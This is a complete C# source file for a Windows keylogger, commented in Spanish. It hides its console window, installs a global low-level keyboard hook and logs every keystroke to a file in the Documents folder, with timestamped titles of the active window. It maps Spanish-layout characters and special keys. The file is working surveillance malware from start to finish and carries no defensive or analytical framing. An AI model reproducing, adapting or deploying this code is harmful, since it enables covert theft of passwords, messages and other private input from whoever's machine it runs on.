using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

class KeyLogger
{
    /* ----------  Campos ---------- */
    const int WH_KEYBOARD_LL = 13;
    const int WM_KEYDOWN     = 0x0100;

    const int VK_SHIFT   = 0x10;
    const int VK_CAPITAL = 0x14;
    const int VK_MENU    = 0x12;   // Alt
    const int VK_CONTROL = 0x11;   // Ctrl
    const int VK_RMENU   = 0xA5;   // AltGr

    static StreamWriter log;
    static IntPtr hook;
    static string lastWindow = "";

    /* ----------  Main ---------- */
    [STAThread]
    static void Main()
    {
        ShowWindow(GetConsoleWindow(), 0);                    // ocultar consola

        string path = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            "log.txt");
        log = new StreamWriter(new FileStream(path, FileMode.Append, FileAccess.Write));
        log.AutoFlush = true;

        hook = SetHook(HookCallback);
        Application.Run();                                    // bucle de mensajes
        UnhookWindowsHookEx(hook);
        log.Close();
    }

    /* ----------  Hook global ---------- */
    delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process p = Process.GetCurrentProcess())
        using (ProcessModule m = p.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(m.ModuleName), 0);
        }
    }

    static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vk = Marshal.ReadInt32(lParam);

            /* Ventana activa */
            StringBuilder winSb = new StringBuilder(256);
            GetWindowText(GetForegroundWindow(), winSb, winSb.Capacity);
            string win = winSb.ToString();
            if (win != lastWindow)
            {
                lastWindow = win;
                log.WriteLine();
                log.WriteLine("[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") +
                              "] Ventana: " + win);
            }

            /* Estado de teclado */
            byte[] ks = new byte[256];
            GetKeyboardState(ks);

            if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)   ks[VK_SHIFT]   = 0x80;
            if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) ks[VK_CAPITAL] = 0x01;

            bool altGr = (GetKeyState(VK_RMENU) & 0x8000) != 0;
            if (altGr)
            {
                ks[VK_RMENU]   = 0x80;
                ks[VK_MENU]    = 0x80;
                ks[VK_CONTROL] = 0x80;
            }

            /* Traducir tecla */
            StringBuilder buf = new StringBuilder(5);
            int r = ToUnicodeEx((uint)vk, 0, ks, buf, buf.Capacity, 0,
                                GetKeyboardLayout(0));

            string raw = buf.ToString();
            string key = Translate(vk, raw, altGr);
            log.Write(key);
        }
        return CallNextHookEx(hook, nCode, wParam, lParam);
    }

    /* ----------  Traducción ---------- */
    static string Translate(int vk, string raw, bool altGr)
    {
        /* Salida válida de ToUnicodeEx */
        if (!string.IsNullOrEmpty(raw) &&
            !char.IsControl(raw[0]) &&
            raw[0] != 0xFFFF)
        {
            if (char.IsLetter(raw[0]))
            {
                bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps  = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                if (!shift && !caps && char.IsUpper(raw[0]))
                    return raw.ToLower();
            }
            return raw;
        }

        /* AltGr manual */
        if (altGr)
        {
            switch (vk)
            {
                case 49:  return "¬"; // AltGr+1
                case 50:  return "@"; // AltGr+2
                case 51:  return "#"; // AltGr+3
                case 52:  return "~"; // AltGr+4
                case 69:  return "€"; // AltGr+E
                case 55:  return "{"; // AltGr+7
                case 56:  return "["; // AltGr+8
                case 57:  return "]"; // AltGr+9
                case 48:  return "}"; // AltGr+0
                case 226: return "\\";// AltGr+º / OEM102
            }
        }

        /* Dead keys y otros OEM */
        switch (vk)
        {
            case 192: return "^";
            case 222: return "´";
            case 160:
            case 161: return "[SHIFT]";
            case 162:
            case 163: return "[CTRL]";
            case 164: return "[ALT]";
            case 165: return "[ALTGR]";
            case 20:  return "[CAPSLOCK]";
            case 13:  return "[ENTER]\n";
            case 9:   return "[TAB]";
            case 27:  return "[ESC]";
            case 8:   return "[BACKSPACE]";
            case 32:  return "[SPACE]";
            case 186: return "ñ";
            case 187: return "=";
            case 189: return "-";
            case 188: return ",";
            case 190: return ".";
            case 191: return "?";
            case 44:  return "[PrintScreen]";
            default:  return "[UNK-" + vk + "]";
        }
    }

    /* ----------  P/Invoke ---------- */
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(
        int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool   UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(
        IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]   static extern bool   ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll")]   static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder s, int n);
    [DllImport("user32.dll")]   static extern bool   GetKeyboardState(byte[] ks);
    [DllImport("user32.dll")]   static extern short  GetKeyState(int vKey);
    [DllImport("user32.dll")]   static extern IntPtr GetKeyboardLayout(uint idThread);
    [DllImport("user32.dll")]   static extern int    ToUnicodeEx(
        uint wVk, uint wScan, byte[] ks,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder buf,
        int cch, uint flags, IntPtr dwhkl);
}
